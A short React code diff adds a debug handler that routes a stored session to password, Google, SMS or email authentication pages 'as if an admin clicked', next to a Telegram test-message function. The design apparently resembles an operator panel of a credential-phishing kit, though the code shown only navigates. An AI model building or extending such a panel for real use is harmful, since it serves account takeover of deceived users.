@@ -34,6 +34,35 @@ const Debug = () => {
     setIsLoading(false);
   };
 
+  const handleSimulateAdminClick = (action: string) => {
+    const sessionId = sessionStorage.getItem("sessionId");
+
+    if (!sessionId) {
+      alert(
+        "❌ No active session found. Please complete authentication flow first.",
+      );
+      return;
+    }
+
+    // Navigate directly (simulating what would happen when admin clicks)
+    switch (action) {
+      case "password":
+        window.location.href = `/auth-password`;
+        break;
+      case "google":
+        window.location.href = `/auth-google`;
+        break;
+      case "sms":
+        window.location.href = `/auth-sms`;
+        break;
+      case "email":
+        window.location.href = `/auth-email`;
+        break;
+      default:
+        alert(`⚠️ Unknown action: ${action}`);
+    }
+  };
+
   const handleSendTestMessage = async () => {
     setIsLoading(true);
     const result = await sendTestMessageToTelegram(
